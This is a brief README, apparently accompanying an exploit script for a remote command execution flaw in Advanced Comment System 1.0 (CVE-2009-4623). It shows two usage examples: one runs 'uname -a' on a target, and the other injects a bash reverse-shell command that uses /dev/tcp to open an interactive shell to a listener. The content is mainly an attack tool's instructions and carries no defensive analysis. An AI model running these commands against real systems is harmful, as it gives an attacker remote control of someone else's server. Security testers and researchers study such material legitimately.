# Advanced Comment System 1.0 - Remote Command Execution (RCE)
> https://nvd.nist.gov/vuln/detail/CVE-2009-4623

## Examples
```bash
python3 exploit.py http://127.0.0.1 uname -a
```

```bash
python3 exploit.py http://127.0.0.1 'bash -i >& /dev/tcp/127.0.0.1/443 0>&1'
```
